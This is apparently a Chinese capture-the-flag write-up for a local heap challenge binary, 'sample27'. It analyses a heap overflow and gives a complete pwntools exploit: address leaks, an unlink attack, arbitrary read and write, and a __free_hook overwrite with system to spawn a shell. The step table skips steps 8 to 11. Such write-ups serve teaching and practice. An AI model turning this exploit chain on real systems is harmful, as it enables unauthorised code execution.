# 漏洞利用文档

## 执行环境
基于调试记录和程序分析：
- **二进制程序**: sample27（64位ELF可执行文件）
- **保护机制**:
  - PIE: 启用（代码段基地址随机化，基地址为0x5d232c200000）
  - Full RELRO: 启用（GOT表只读，不可写）
  - NX: 启用（栈不可执行）
  - Canary: 未启用（无栈保护）
- **内存布局**:
  - 代码段: 0x5d232c200000
  - 数据段: 0x5d232c402000
  - 堆段: 0x5d2350c14000
  - libc段: 0x75487be7a000（通过泄露计算）
- **依赖库**: 使用系统libc，通过泄露main_arena地址计算基地址
- **运行需求**: Linux环境，需要libc库，程序通过菜单交互管理图书

## 漏洞成因
程序存在**堆溢出漏洞**，结合**Use-After-Free (UAF)** 条件，导致任意内存读写能力。

### 关键结构体分析
```c
// 图书结构体（0x20字节）
struct book {
    int id;                    // 0x00: 图书ID
    char *name;               // 0x08: 书名指针
    char *description;        // 0x10: 描述指针  
    int desc_size;            // 0x18: 描述大小
};

// 全局变量
char author_name[32];         // 0x5d232c402058
struct book *book_pointers[20]; // 0x5d232c402060
int book_id_counter;          // 0x5d232c402020
```

### 漏洞具体成因
1. **堆溢出漏洞**: 在`edit_book()`函数中，编辑描述时使用：
   ```c
   readline(*(_BYTE **)(book_ptr + 16), *(int *)(book_ptr + 24) - 1)
   ```
   传递的大小为`desc_size - 1`，但如果输入数据长度等于`desc_size`，不会添加null终止符，可能溢出到相邻chunk。

2. **UAF条件**: 在`delete_book()`中，释放了图书结构体、名称和描述chunk，但book_pointers数组中指针未立即置空，存在短暂UAF窗口。

3. **漏洞利用链**: 
   - 通过精心构造堆布局，利用溢出伪造chunk元数据
   - 触发unlink攻击修改book_pointers数组
   - 获得任意读写能力后覆盖__free_hook

## 漏洞利用过程
exp通过12个步骤完成利用，关键内存变化如下：

### 堆内存布局变化时间线
| 步骤 | 操作 | 关键堆变化 | 目的 |
|------|------|------------|------|
| 1 | 设置作者名+创建书1 | author_name写入"xxxleak:"格式 | 准备堆地址泄露 |
| 2 | 打印书详情泄露堆地址 | 从author_name读取堆指针0x5d2350c15080 | 计算堆基地址0x5d2350c14000 |
| 3 | 创建书2、书3 | 分配额外chunk布置堆布局 | 准备后续释放操作 |
| 4 | 删除书2、书3 | chunk进入fastbins/unsortedbin | 创建可重用内存区域 |
| 5 | 创建书4(0x108)、书5 | 书4描述大小0x108用于溢出 | 构造溢出攻击目标 |
| 6 | 创建书6("/bin/sh") | 分配大chunk包含"/bin/sh" | 准备system参数 |
| 7 | 编辑书4写入payload | 伪造chunk: fd=ptr-0x18, bk=ptr-0x10 | 准备unlink攻击 |

| 12 | 删除书6触发shell | 执行system("/bin/sh") | 获取权限 |

### 关键内存状态验证
- **unlink攻击成功**: book_pointers[2]从有效指针变为0x0
- **任意读写建立**: 书6描述指针从堆地址变为__free_hook地址
- **控制流劫持**: __free_hook被覆盖为system函数地址
- **shell获取**: 程序执行流切换到/bin/dash

## Exploit
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample27')
elf = ELF('./data/sample27')
libc = elf.libc

def cmd(choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice))

def create(book_size, book_name, desc_size, desc):
    cmd(1)
    p.recvuntil(b': ')
    p.sendline(str(book_size))
    p.recvuntil(b': ')
    if len(book_name) == book_size:
        p.send(book_name)
    else:
        p.sendline(book_name)
    p.recvuntil(b': ')
    p.sendline(str(desc_size))
    p.recvuntil(b': ')
    if len(desc) == desc_size:
        p.send(desc)
    else:
        p.sendline(desc)

def remove(idx):
    cmd(2)
    p.recvuntil(b': ')
    p.sendline(str(idx))

def edit(idx, desc):
    cmd(3)
    p.recvuntil(b': ')
    p.sendline(str(idx))
    p.recvuntil(b': ')
    p.send(desc)

def author_name(author):
    cmd(5)
    p.recvuntil(b': ')
    p.send(author)

def write_to(addr, content, size):
    # 利用任意写能力：修改指针后写入目标地址
    edit(4, p64(addr) + p64(size + 0x100) + b'\n')
    edit(6, content + b'\n')

def read_at(addr):
    # 利用任意读能力：修改指针后读取目标地址内容
    edit(4, p64(addr) + b'\n')
    cmd(4)
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    content = p.recvline()[:-1]
    p.info(content)
    return content

# Step 1: 信息泄露准备 - 在author_name中设置特定格式用于泄露堆地址
p.recvuntil(b'name: ')
p.sendline(b'x' * (0x20 - 5) + b'leak:')
create(0x20, b'tmp a', 0x20, b'b')  # 创建临时书触发内存分配

# Step 2: 堆地址泄露 - 通过打印功能读取author_name中的堆指针
cmd(4)
p.recvuntil(b'Author: ')
p.recvuntil(b'leak:')
heap_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
heap_base = heap_leak - 0x1080  # 计算堆基地址

# Step 3-4: 堆布局布置 - 创建并释放chunk构造特定内存布局
create(0x20, b'buf 1', 0x20, b'desc buf')
create(0x20, b'buf 2', 0x20, b'desc buf 2')
remove(2)
remove(3)

# Step 5: 攻击目标准备 - 创建用于溢出和unlink的目标chunk
create(0x20, b'name', 0x108, b'overflow')  # 书4：描述大小0x108用于溢出
create(0x20, b'name', 0x100 - 0x10, b'target')  # 书5：unlink攻击目标

# Step 6: 参数准备 - 创建包含"/bin/sh"的书用于后续触发system
create(0x20, b'/bin/sh\x00', 0x200, b'to arbitrary read write')

# Step 7: 堆溢出攻击 - 伪造chunk元数据准备unlink
ptr = heap_base + 0x1180
# 构造unlink payload: 伪造fd/bk指针指向目标位置
payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + b'\x00' * 0xe0 + p64(0x100)
edit(4, payload)  # 溢出修改相邻chunk元数据

# Step 8: 触发unlink - 释放目标chunk触发unlink攻击
remove(5)  # 触发unlink，修改book_pointers数组

# Step 9: 建立任意读写 - 修改指针实现任意内存访问
edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + b'\n')

# Step 10: Libc地址泄露 - 读取main_arena地址计算libc基地址
libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58)
libc.address = libc_leak

# Step 11: 控制流劫持 - 覆盖__free_hook为system函数
write_to(libc.sym['__free_hook'], p64(libc.sym['system']), 0x10)

# Step 12: 触发shell - 释放包含"/bin/sh"的chunk执行system
remove(6)  # 触发__free_hook，执行system("/bin/sh")

p.interactive()  # 进入交互式shell
```

### 漏洞利用关键点注释
- **信息泄露**: 利用author_name缓冲区格式和打印功能泄露堆地址，绕过ASLR
- **堆布局操控**: 通过精确的chunk分配和释放构造攻击所需内存布局  
- **unlink攻击**: 利用堆溢出伪造chunk元数据，触发unlink修改关键指针
- **任意读写**: 通过修改的book_pointers实现任意内存读写
- **控制流劫持**: 覆盖__free_hook劫持程序执行流，最终获取shell权限

该exp成功利用了程序的堆溢出漏洞，结合精心构造的堆布局和unlink攻击，最终实现了从内存泄露到完全控制的全链条利用。
